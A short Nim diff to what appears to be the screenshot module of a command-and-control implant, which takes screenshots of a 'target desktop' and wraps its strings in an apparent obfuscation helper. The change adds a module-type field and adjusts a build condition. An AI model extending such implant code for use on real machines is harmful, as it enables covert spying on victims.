@@ -7,6 +7,7 @@ proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult
 let module* = Module(
     name: protect("screenshot"), 
     description: protect("Take and retrieve a screenshot of the target desktop."),
+    moduleType: MODULE_SCREENSHOT,
     commands: @[
         Command(
             name: protect("screenshot"),
@@ -20,7 +21,7 @@ let module* = Module(
 )
 
 # Implement execution functions
-when defined(server):
+when not defined(agent):
     proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = nil
 
 when defined(agent):
